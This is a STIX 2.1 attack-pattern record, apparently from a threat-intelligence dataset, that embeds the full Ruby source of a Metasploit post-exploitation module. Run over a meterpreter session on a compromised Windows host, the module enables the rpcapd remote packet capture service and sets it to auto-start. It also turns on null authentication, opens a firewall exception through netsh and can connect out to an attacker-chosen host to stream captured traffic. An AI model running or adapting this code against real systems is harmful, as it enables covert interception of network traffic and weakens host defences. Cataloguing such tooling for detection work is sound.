{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--28acf75c-7e54-4877-8732-6d15206c868c",
    "created": "2024-08-14T16:33:04.968958Z",
    "modified": "2024-08-14T16:33:04.968962Z",
    "name": "Windows Manage Remote Packet Capture Service Starter",
    "description": " This module enables the Remote Packet Capture System (rpcapd service) included in the default installation of Winpcap. The module allows you to set up the service in passive or active mode (useful if the client is behind a firewall). If authentication is enabled you need a local user account to capture traffic. PORT will be used depending of the mode configured.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/rpcapd_start.rb",
            "external_id": "rpcapd_start.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Remote Packet Capture Service Starter',\n        'Description' => %q{\n          This module enables the Remote Packet Capture System (rpcapd service)\n          included in the default installation of Winpcap. The module allows you to set up\n          the service in passive or active mode (useful if the client is behind a firewall).\n          If authentication is enabled you need a local user account to capture traffic.\n          PORT will be used depending of the mode configured.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('NULLAUTH', [ true, 'Enable Null Authentication.', true]),\n        OptBool.new('ACTIVE', [ true, 'Enable rpcapd in active mode (passive by default).', false]),\n        OptAddress.new('RHOST', [ false, 'Remote host to connect (set in active mode only).']),\n        OptInt.new('PORT', [ true, 'Local/Remote port to capture traffic.', 2002])\n      ]\n    )\n  end\n\n  def run\n    if is_admin?\n      serv = service_info('rpcapd')\n      print_status(\"Checking if machine #{sysinfo['Computer']} has rpcapd service\")\n\n      if serv[:display] !~ /remote/i\n        print_error(\"This machine doesn't seem to have the rpcapd service\")\n      else\n        print_status(\"Rpcap service found: #{serv[:display]}\")\n\n        start_type = serv[:starttype]\n        prog = get_env('ProgramFiles') << '\\\\winpcap\\\\rpcapd.exe'\n        if start_type != START_TYPE_AUTO\n          print_status(\"Setting rpcapd as 'auto' service\")\n          service_change_startup('rpcapd', START_TYPE_AUTO)\n        end\n        if datastore['ACTIVE']\n          if datastore['RHOST'].nil?\n            print_error('RHOST is not set ')\n            return\n          else\n            p = prog << \" -d -a #{datastore['RHOST']},#{datastore['PORT']} -v \"\n            print_status(\"Installing rpcap in ACTIVE mode (remote port: #{datastore['PORT']})\")\n          end\n        else\n          fw_enable(prog)\n          print_status(\"Installing rpcap in PASSIVE mode (local port: #{datastore['PORT']}) \")\n          p = prog << \" -d -p #{datastore['PORT']} \"\n        end\n        if datastore['NULLAUTH']\n          p << '-n'\n        end\n        run_rpcapd(p)\n      end\n    else\n      print_error(\"You don't have enough privileges. Try getsystem.\")\n    end\n  end\n\n  def run_rpcapd(p)\n    service_name = 'rpcapd'\n    begin\n      if service_restart(service_name)\n        print_good(\"Rpcapd started successfully: #{p}\")\n      else\n        print_error('There was an error restarting rpcapd.exe.')\n      end\n    rescue ::Exception => e\n      print_error(\"The following Error was encountered: #{e.class} #{e}\")\n    end\n  end\n\n  def fw_enable(prog)\n    print_status('Enabling rpcapd.exe in Windows Firewall')\n    begin\n      if file_exist?(prog)\n        cmd_exec('netsh', \"firewall add allowedprogram \\\"#{prog}\\\" \\\"Windows Service\\\" ENABLE \", 30)\n      else\n        print_error(\"rpcad.exe doesn't exist in #{prog}. Check the installation of WinPcap\")\n      end\n    rescue ::Exception => e\n      print_status(\"The following Error was encountered: #{e.class} #{e}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}